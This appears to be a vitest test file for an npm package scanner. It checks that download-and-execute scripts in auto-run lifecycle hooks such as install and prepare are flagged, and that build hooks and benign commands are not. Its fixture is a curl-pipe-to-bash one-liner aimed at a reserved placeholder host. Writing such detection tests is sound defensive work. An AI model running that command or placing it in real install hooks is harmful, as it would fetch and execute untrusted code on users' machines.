/**
 * Coverage of the npm lifecycle hooks that run without being asked.
 *
 * Three code paths read package.json scripts, and each used to carry its own
 * hand-typed list of hook names:
 *
 *   - npm-scanner.ts    `checkPackageScripts`  (the `scg npm <pkg>` registry path)
 *   - scanner.ts        `checkPackageJson`     (the directory path)
 *   - install-hook-scanner.ts `analyzeInstallHooks`
 *
 * The first two listed four names and omitted `install` and `prepare`, so a
 * package whose payload sat in `"install"` was reported by neither. All three
 * now read AUTO_RUN_LIFECYCLE_HOOKS. These tests assert the behaviour per hook
 * rather than the constant, so they stay meaningful if the plumbing changes.
 *
 * The precision half matters as much as the recall half: this scanner gets
 * switched off if it cries wolf. The benign and excluded-hook blocks below pin
 * that `prepublishOnly` (npm's documented home for build steps, and where this
 * repo keeps `npm run build`) is NOT treated as install-time risk, and that
 * ordinary build commands in the newly covered hooks stay silent.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { checkPackageScripts } from "../npm-scanner.js";
import { analyzeInstallHooks, extractInstallScripts } from "../install-hook-scanner.js";
import { scan } from "../scanner.js";
import { AUTO_RUN_LIFECYCLE_HOOKS } from "../patterns.js";
import type { Finding } from "../types.js";

/** A download-and-execute one-liner. Reserved TLD, so it resolves nowhere. */
const PAYLOAD = "curl https://cdn.example.invalid/p.sh | bash";

/** Hooks that the four-name lists already covered, kept as a regression guard. */
const ALREADY_COVERED = [
  "preinstall",
  "postinstall",
  "preuninstall",
  "postuninstall",
] as const;

/** Hooks this change adds to the registry and directory paths. */
const NEWLY_COVERED = [
  "install",
  "prepublish",
  "preprepare",
  "prepare",
  "postprepare",
] as const;

function registryFindings(hook: string, script: string): Finding[] {
  const findings: Finding[] = [];
  checkPackageScripts({ scripts: { [hook]: script } }, findings);
  return findings;
}

const curlHits = (findings: Finding[]) =>
  findings.filter((f) => f.rule === "SCRIPT_CURL_EXEC");

describe("registry scan path reports a download-exec payload in every auto-run hook", () => {
  for (const hook of NEWLY_COVERED) {
    it(`reports "${hook}"`, () => {
      const hits = curlHits(registryFindings(hook, PAYLOAD));
      expect(hits).toHaveLength(1);
      expect(hits[0].severity).toBe("critical");
      // The hook name reaches the operator, so the report says which script runs.
      expect(hits[0].description).toContain(hook);
    });
  }

  for (const hook of ALREADY_COVERED) {
    it(`still reports "${hook}" (regression)`, () => {
      expect(curlHits(registryFindings(hook, PAYLOAD))).toHaveLength(1);
    });
  }
});

describe("registry scan path stays quiet where it should", () => {
  // prepublishOnly runs on `npm publish` only. It never executes for anyone
  // installing the package, and npm documents it as the place to put build
  // steps - this repo's own package.json uses it for `npm run build`. Scanning
  // it would report release tooling as an install-time risk.
  it('does not scan "prepublishOnly"', () => {
    expect(curlHits(registryFindings("prepublishOnly", PAYLOAD))).toHaveLength(0);
  });

  // Same reasoning for pack-time and for anything a human has to type.
  for (const hook of ["prepack", "postpack", "build", "test", "start"]) {
    it(`does not scan "${hook}"`, () => {
      expect(curlHits(registryFindings(hook, PAYLOAD))).toHaveLength(0);
    });
  }

  // Recall is worthless if the newly covered hooks fire on normal projects.
  const benign = ["tsc", "npm run build", "husky install", "node-gyp rebuild"];
  for (const hook of NEWLY_COVERED) {
    for (const script of benign) {
      it(`leaves "${hook}": "${script}" clean`, () => {
        expect(registryFindings(hook, script)).toHaveLength(0);
      });
    }
  }
});

describe("directory scan path reports the same payload end to end", () => {
  let tmpRoot: string;

  beforeAll(() => {
    tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), "scg-lifecycle-"));
  });
  afterAll(() => {
    if (tmpRoot) fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  for (const hook of NEWLY_COVERED) {
    it(`reports "${hook}" in a scanned package.json`, async () => {
      const dir = path.join(tmpRoot, hook);
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(
        path.join(dir, "package.json"),
        JSON.stringify(
          { name: "fixture-pkg", version: "1.0.0", scripts: { [hook]: PAYLOAD } },
          null,
          2,
        ),
      );

      const report = await scan({ target: dir, format: "text" });
      const finding = report.findings.find((f) => f.rule === "SCRIPT_CURL_EXEC");
      expect(finding).toBeDefined();
      expect(finding?.severity).toBe("critical");
    });
  }
});

describe("install-hook analysis covers the same hook names", () => {
  // analyzeInstallHooks already read install and prepare; prepublish and the
  // prepare wrappers were the gap on this path.
  for (const hook of ["prepublish", "preprepare", "postprepare"]) {
    it(`reports a download-exec chain in "${hook}"`, () => {
      const hits = analyzeInstallHooks({ [hook]: PAYLOAD }, "package.json").filter(
        (f) => f.rule === "INSTALL_HOOK_DOWNLOAD_EXEC",
      );
      expect(hits).toHaveLength(1);
    });
  }

  it("extracts every auto-run hook from package.json, and nothing else", () => {
    const declared = Object.fromEntries(
      [...AUTO_RUN_LIFECYCLE_HOOKS, "prepublishOnly", "build"].map((h) => [
        h,
        `echo ${h}`,
      ]),
    );
    const extracted = extractInstallScripts(
      JSON.stringify({ scripts: declared }),
    );
    expect(Object.keys(extracted ?? {}).sort()).toEqual(
      [...AUTO_RUN_LIFECYCLE_HOOKS].sort(),
    );
  });
});
